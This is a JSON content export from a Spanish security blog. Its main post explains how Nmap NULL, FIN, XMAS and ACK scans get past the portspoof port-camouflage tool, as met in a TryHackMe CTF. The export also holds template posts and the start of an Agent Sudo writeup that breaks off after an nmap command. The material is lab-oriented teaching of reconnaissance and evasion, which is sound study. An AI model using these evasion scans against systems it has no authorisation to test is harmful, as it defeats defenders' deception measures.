{"generatedAt":1752975462864,"generateTime":1554,"contents":[{"_path":"/blog/como-evadir-portspoof-con-nmap","_dir":"blog","_draft":false,"_partial":false,"_locale":"","title":"Como evadir \"portspoof\" con Nmap","description":"Aprende sobre \"portspoof\", una herramienta para camuflar puertos cerrados como activos, y como evadirla durante el escaneo de un host con Nmap.","published":"2025/07/18","slug":"como-evadir-portspoof-con-nmap","body":{"type":"root","children":[{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"thumbnail","src":"/blog/como-evadir-portspoof-con-nmap/thumbnail.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Durante la realización del desafió \"Cheese CTF\" de TryHackMe me tope con un resultado inusual de Nmap luego de escanear los puertos TCP de la maquina objetivo."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"nmap-scan","src":"/blog/como-evadir-portspoof-con-nmap/nmap-scan.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¿Acaso todos los puertos se encuentran abiertos? Nuestra intuición nos dice que esto no puede ser posible."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Efectivamente, hay medidas de seguridad implementadas en el servidor web que camuflan los puertos cerrados como abiertos, lo que imposibilita a un atacante (como nosotros) de distinguir los puertos que realmente están abiertos de los que no lo están, pero pretenden estarlos. Si hubiéramos escaneado todos los 65535 puertos del servidor web, los resultados serian abrumadores y completamente inútiles desde nuestra perspectiva como atacante."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Y un escaneo de versiones o una ejecución de scripts del Nmap Scripting Engine seria aun mas catastrófico, llegando a tardar inclusive horas y presentando resultados completamente confusos y sin valor alguno."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"nmap-version-scan","src":"/blog/como-evadir-portspoof-con-nmap/nmap-version-scan.png"},"children":[]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Este escaneo tomo 33 minutos en completarse y el resultado debe ser examinado cuidadosamente para distinguir los posibles puertos abiertos de los que realmente no lo están."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Afortunadamente para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"rootear"}]},{"type":"text","value":" esta maquina tan solo necesitamos del puerto 22 (SSH) y 80 (HTTP), ademas de conocimiento de filtros PHP para transformar un LFI en un RCE."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Luego de completar este desafió, me puse en la tarea de averiguar que estaba sucediendo durante el escaneo de puertos y me tope con la herramienta que producía estos resultados falsos: "},{"type":"element","tag":"a","props":{"href":"https://drk1wi.github.io/portspoof/","rel":["nofollow"]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":"."}]},{"type":"element","tag":"h2","props":{"id":"introducción-a-portspoof"},"children":[{"type":"text","value":"Introducción a portspoof"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Según su autor, esta herramienta permite mejorar la seguridad de los sistemas a traves de una serie de técnicas de camuflaje. Los resultados de los escaneos de puertos de un atacante se verán completamente destrozados y carentes de sentido, ya que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" responderá con un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN/ACK"}]},{"type":"text","value":" a las conexiones TCP en los puertos configurados (simulando que el puerto esta abierto), ademas de que responderá con "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"banners"}]},{"type":"text","value":" validos generados dinámicamente a partir de una base de datos, lo que dificulta a un atacante el identificar si el puerto realmente contiene un servicio activo o no, y que información puede extraer de este servicio."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"wireshark","src":"/blog/como-evadir-portspoof-con-nmap/wireshark.png"},"children":[]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Los puertos 1 y 3 no están realmente abiertos, pero portspoof responde a nuestros paquetes SYN con un SYN/ACK."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ya entrando en detalles, para que esta herramienta funcione correctamente es necesario hacer uso de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"iptables"}]},{"type":"text","value":" para crear una nueva regla en la tabla NAT que redirija el trafico TCP del puerto que queremos \"camuflar\" al puerto en el que opera el demonio de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" (por defecto es el puerto TCP 4444), excluyendo los puertos que realmente estan abiertos y queremos que sean accesibles. Todo esto lo podemos automatizar con un script de bash (tomado de "},{"type":"element","tag":"a","props":{"href":"https://www.vicarius.io/vsociety/posts/research-evading-portspoof-solution","rel":["nofollow"]},"children":[{"type":"text","value":"https://www.vicarius.io/vsociety/posts/research-evading-portspoof-solution"}]},{"type":"text","value":")."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"#!/bin/bash\nspoofPorts=\"1:19 23:24 26:52 54:79 81:109 112:122 124:442 444:464 466:586 588:891 893:2048 2050:8079 8081:32800 32801:65535\"\nfor prange in ${spoofPorts}; do\niptables -t nat -A PREROUTING -i eth0 -p tcp -m tcp --dport ${prange} -j REDIRECT --to-ports 4444\ndone\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#6A737D"},"children":[{"type":"text","value":"#!/bin/bash\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":"spoofPorts"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":"="}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":"\"1:19 23:24 26:52 54:79 81:109 112:122 124:442 444:464 466:586 588:891 893:2048 2050:8079 8081:32800 32801:65535\"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":"for"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" prange in ${spoofPorts};"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" do\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"iptables -t nat -A PREROUTING -i eth0 -p tcp -m tcp --dport $"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":"{prange}"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" -j REDIRECT --to-ports 4444\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":"done\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"n0pspoof-una-herramienta-para-evadir-portspoof"},"children":[{"type":"text","value":"N0Pspoof: ¿Una herramienta para evadir portspoof?"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Durante mi investigación de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" encontré una herramienta titulada como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"N0Pspoof"}]},{"type":"text","value":" diseñada para evadir "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" y creada por el mismo autor del anterior articulo. Pero te aseguro que esta herramienta no funcionó en evadir "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" durante el desafió \"Cheese CTF\", ademas de que por su naturaleza es extremadamente lenta al probar la disponibilidad de una gran cantidad de puertos y es infinitamente menos versátil que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"nmap"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"n0pspoof","src":"/blog/como-evadir-portspoof-con-nmap/n0pspoof.png"},"children":[]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¿Estas seguro de eso N0Pspoof?"}]}]},{"type":"element","tag":"h3","props":{"id":"evasión-manual-pero-tediosa"},"children":[{"type":"text","value":"Evasión manual (pero tediosa)"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Una vez el trafico de un puerto \"camuflado\" sea redirigido a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":", este responderá con un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN/ACK"}]},{"type":"text","value":" para indicar que el puerto se encuentra falsamente abierto y generara un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"banner"}]},{"type":"text","value":" falso basado en el numero de puerto en cuestión. Finalmente cerrara la conexión. De esta forma, tanto escáneres automáticos como Nmap y pruebas manuales con "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"telnet"}]},{"type":"text","value":" o "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"netcat"}]},{"type":"text","value":" darán resultados poco fiables en cuanto a si el puerto esta abierto o no, y que servicio se encuentra activo dentro de este."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La única forma de sortear esta herramienta es interactuando manualmente con cada puerto con un cliente adecuado o con herramientas como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"telnet"}]},{"type":"text","value":" y "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"netcat"}]},{"type":"text","value":", y verificar si el puerto responde como debería según el servicio que (probablemente) se encuentre alojado en este. Por su puesto, hacer esto con cada puerto es tedioso, más aun si queremos probar puertos poco comunes."}]},{"type":"element","tag":"h2","props":{"id":"evadir-portspoof-con-nmap"},"children":[{"type":"text","value":"Evadir portspoof con Nmap"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Sin la naturaleza propia de la herramienta tiene sus fallas (es una herramienta vieja después de todo) y es posible sortear estas contramedidas haciendo uso de escaneos TCP NULL, FIN y XMAS. "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" espera recibir un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":" en los puertos \"camuflados\" al inicio de una conexión TCP para luego aparentar que el puerto esta abierto y enviar información falsa en el "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"banner"}]},{"type":"text","value":", pero no espera recibir paquetes malformados o que se inicie una conexión TCP con paquetes diferentes al usual "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":". En caso de recibir un paquete diferente al usual "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":", la herramienta no tendrá efecto y el "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"host"}]},{"type":"text","value":" se vera forzado a enviar una respuesta conforme al RFC correspondiente."}]},{"type":"element","tag":"h3","props":{"id":"escaneos-tcp-null-fin-y-xmas"},"children":[{"type":"text","value":"Escaneos TCP NULL, FIN y XMAS"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Los escaneos TCP NULL, FIN y XMAS deben su nombre a que envían paquetes sin banderas o con banderas especiales, siempre excluyendo la bandera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":", que es usada para iniciar un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"three-way handshake"}]},{"type":"text","value":". De esta forma, estos escaneos son útiles para evadir firewalls configurados para bloquear paquetes TCP con la bandera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":" y por tanto conexiones TCP entrantes, al igual son considerados mas sigilosos que un escaneo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":" ya que evitan el posible registro de conexiones TCP al nunca enviar un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SYN"}]},{"type":"text","value":" e iniciar un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"three-way handshake"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para nuestro caso, usaremos estos escaneos para sortear las contramedidas de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"portspoof"}]},{"type":"text","value":" y probar los puertos abiertos del servidor web haciendo uso de Nmap de forma rápida y eficaz. Estos tres escaneos esperan recibir un paquete TCP "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"RST"}]},{"type":"text","value":" si el puerto se encuentra cerrado, o ningún paquete de vuelta si el puerto esta abierto. Cabe aclarar que un si no se envía de vuelta un paquete de respuesta, esto también es un indicativo de que el paquete enviado inicialmente fue filtrado por un firewall, por tanto Nmap identificara el puerto como \"abierto o filtrado\"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Por supuesto los escaneos TCP NULL, FIN y XMAS no son la panacea para evitar firewalls e IDS modernos. Y no son capaces de identificar correctamente si un puerto esta abierto o no en sistemas como Microsoft Windows y dispositivos Cisco, ya que estos y otros sistemas enviaran un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"RST"}]},{"type":"text","value":" al recibir un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"ACK"}]},{"type":"text","value":", independientemente de si el puerto esta abierto o no."}]},{"type":"element","tag":"h3","props":{"id":"usando-el-escaneo-tcp-null-para-evadir-portspoof"},"children":[{"type":"text","value":"Usando el escaneo TCP NULL para evadir portspoof"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Con Nmap podemos hacer escaneos NULL, FIN y XMAS haciendo uso de las banderas "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-sN"}]},{"type":"text","value":", "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-sF"}]},{"type":"text","value":" y "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-sX"}]},{"type":"text","value":", respectivamente. Usaremos un escaneo NULL al ser el mas simple, aunque los tres servirán para nuestro propósito."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"nmap-null-scan","src":"/blog/como-evadir-portspoof-con-nmap/nmap-null-scan.png"},"children":[]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El puerto 4444 es el puerto donde opera el demonio de portspoof."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Finalmente logramos identificar los puertos que realmente están abiertos (o filtrados). Para verificar si realmente están filtrados podemos usar un escaneo TCP ACK con la bandera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-sA"}]},{"type":"text","value":". Si el puerto se encuentra abierto o cerrado, responderá con un paquete "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"RST"}]},{"type":"text","value":". De lo contrario, no enviara de vuelta una respuesta."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"nmap-ack-scan","src":"/blog/como-evadir-portspoof-con-nmap/nmap-ack-scan.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Verificamos que los puertos no se encuentran filtrados, por lo que ahora podemos realizar escaneo de versiones y hacer uso del Nmap Scripting Engine con confianza."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"nmap-version-real-scan","src":"/blog/como-evadir-portspoof-con-nmap/nmap-version-real-scan.png"},"children":[]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"No obtuvimos información valiosa con este escaneo, pero valía la pena realizarlo sabiendo que estos puertos realmente están abiertos."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ahora que nuestra fase de escaneo ha concluido, podemos proceder a enumerar individualmente estos servicios y continuar con nuestra prueba de penetración."}]},{"type":"element","tag":"style","props":{},"children":[{"type":"text","value":"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"introducción-a-portspoof","depth":2,"text":"Introducción a portspoof","children":[{"id":"n0pspoof-una-herramienta-para-evadir-portspoof","depth":3,"text":"N0Pspoof: ¿Una herramienta para evadir portspoof?"},{"id":"evasión-manual-pero-tediosa","depth":3,"text":"Evasión manual (pero tediosa)"}]},{"id":"evadir-portspoof-con-nmap","depth":2,"text":"Evadir portspoof con Nmap","children":[{"id":"escaneos-tcp-null-fin-y-xmas","depth":3,"text":"Escaneos TCP NULL, FIN y XMAS"},{"id":"usando-el-escaneo-tcp-null-para-evadir-portspoof","depth":3,"text":"Usando el escaneo TCP NULL para evadir portspoof"}]}]}},"_type":"markdown","_id":"content:blog:como-evadir-portspoof-con-nmap.md","_source":"content","_file":"blog/como-evadir-portspoof-con-nmap.md","_stem":"blog/como-evadir-portspoof-con-nmap","_extension":"md"},{"_path":"/blog/template","_dir":"blog","_draft":false,"_partial":false,"_locale":"","title":"Plantilla de post","description":"Esto es la plantilla para un post.","published":"2025/05/28","slug":"template","body":{"type":"root","children":[{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Anuncio"}]}]},{"type":"element","tag":"h2","props":{"id":"titulo-2"},"children":[{"type":"text","value":"Titulo 2"}]},{"type":"element","tag":"h3","props":{"id":"titulo-3"},"children":[{"type":"text","value":"Titulo 3"}]},{"type":"element","tag":"h4","props":{"id":"titulo-4"},"children":[{"type":"text","value":"Titulo 4"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Lorem ipsum"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"peas","src":"/projects/peas-updater.png"},"children":[]}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"mkdir my-express-api\ncd my-express-api\nnpm init -y\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"mkdir"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" my-express-api\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"cd"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" my-express-api\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"npm"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" init"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -y\n"}]}]}]}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Una"}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Lista"}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Simple"}]}]},{"type":"element","tag":"ol","props":{},"children":[{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Uno"}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Dos"}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Tres"}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"Negrilla"}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"Italico"}]}]},{"type":"element","tag":"table","props":{},"children":[{"type":"element","tag":"thead","props":{},"children":[{"type":"element","tag":"tr","props":{},"children":[{"type":"element","tag":"th","props":{},"children":[{"type":"text","value":"Key"}]},{"type":"element","tag":"th","props":{},"children":[{"type":"text","value":"Type"}]},{"type":"element","tag":"th","props":{},"children":[{"type":"text","value":"Description"}]}]}]},{"type":"element","tag":"tbody","props":{},"children":[{"type":"element","tag":"tr","props":{},"children":[{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"1"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Wonderful"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Table"}]}]},{"type":"element","tag":"tr","props":{},"children":[{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"2"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Wonderful"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Data"}]}]},{"type":"element","tag":"tr","props":{},"children":[{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"3"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Wonderful"}]},{"type":"element","tag":"td","props":{},"children":[{"type":"text","value":"Website"}]}]}]}]},{"type":"element","tag":"style","props":{},"children":[{"type":"text","value":"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"titulo-2","depth":2,"text":"Titulo 2","children":[{"id":"titulo-3","depth":3,"text":"Titulo 3"}]}]}},"_type":"markdown","_id":"content:blog:template.md","_source":"content","_file":"blog/template.md","_stem":"blog/template","_extension":"md"},{"_path":"/projects/peass-updater","_dir":"projects","_draft":false,"_partial":false,"_locale":"","name":"PEASS-updater","url":"https://github.com/Picolin64/PEASS-updater","description":"Script para descargar y actualizar los scripts de la suite PEAS de forma automática y granular.","thumbnail":"/projects/PEASS-updater.png","_id":"content:projects:1.PEASS-updater.json","_type":"json","title":"PEASS Updater","_source":"content","_file":"projects/1.PEASS-updater.json","_stem":"projects/1.PEASS-updater","_extension":"json"},{"_path":"/writeups/template","_dir":"writeups","_draft":false,"_partial":false,"_locale":"","title":"Plantilla de writeup","description":"","published":"2025/05/28","slug":"template","image":"/avatar.jpg","body":{"type":"root","children":[{"type":"element","tag":"h2","props":{"id":"escaneo"},"children":[{"type":"text","value":"Escaneo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"enumeración-de-servicios"},"children":[{"type":"text","value":"Enumeración de servicios"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"explotación"},"children":[{"type":"text","value":"Explotación"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"enumeración-post-explotación"},"children":[{"type":"text","value":"Enumeración post-Explotación"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"escalada-de-privilegios"},"children":[{"type":"text","value":"Escalada de privilegios"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"persistencia"},"children":[{"type":"text","value":"Persistencia"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"post-root"},"children":[{"type":"text","value":"Post-Root"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"resumen-ejecutivo"},"children":[{"type":"text","value":"Resumen ejecutivo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"remediación"},"children":[{"type":"text","value":"Remediación"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"conclusiones"},"children":[{"type":"text","value":"Conclusiones"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"escaneo","depth":2,"text":"Escaneo"},{"id":"enumeración-de-servicios","depth":2,"text":"Enumeración de servicios"},{"id":"explotación","depth":2,"text":"Explotación"},{"id":"enumeración-post-explotación","depth":2,"text":"Enumeración post-Explotación"},{"id":"escalada-de-privilegios","depth":2,"text":"Escalada de privilegios"},{"id":"persistencia","depth":2,"text":"Persistencia"},{"id":"post-root","depth":2,"text":"Post-Root"},{"id":"resumen-ejecutivo","depth":2,"text":"Resumen ejecutivo"},{"id":"remediación","depth":2,"text":"Remediación"},{"id":"conclusiones","depth":2,"text":"Conclusiones"}]}},"_type":"markdown","_id":"content:writeups:template.md","_source":"content","_file":"writeups/template.md","_stem":"writeups/template","_extension":"md"},{"_path":"/writeups/tryhackme-agent-sudo","_dir":"writeups","_draft":false,"_partial":false,"_locale":"","title":"TryHackMe | Agent Sudo","description":"","published":"2025/05/30","slug":"tryhackme-agent-sudo","image":"/writeups/tryhackme-agent-sudo/thumbnail.png","body":{"type":"root","children":[{"type":"element","tag":"img","props":{"src":"/writeups/tryhackme-agent-sudo/thumbnail.png","width":"200px","heigh":"200px/"},"children":[]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://tryhackme.com/room/agentsudoctf","rel":["nofollow"]},"children":[{"type":"text","value":"https://tryhackme.com/room/agentsudoctf"}]}]},{"type":"element","tag":"h2","props":{"id":"escaneo"},"children":[{"type":"text","value":"Escaneo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Escaneamos todos los 65535 puertos TCP de la maquina objetivo con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"Nmap"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -p-"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"nmap:"}]},{"type":"text","value":" Herramienta para escanear puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-p-:"}]},{"type":"text","value":" Escanear todos los puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n:"}]},{"type":"text","value":" No realizar resolución DNS."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-Pn:"}]},{"type":"text","value":" Asumir que el "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"host"}]},{"type":"text","value":" esta en linea para evitar que Nmap intente primero descubrirlo."}]},{"type":"text","value":"\n        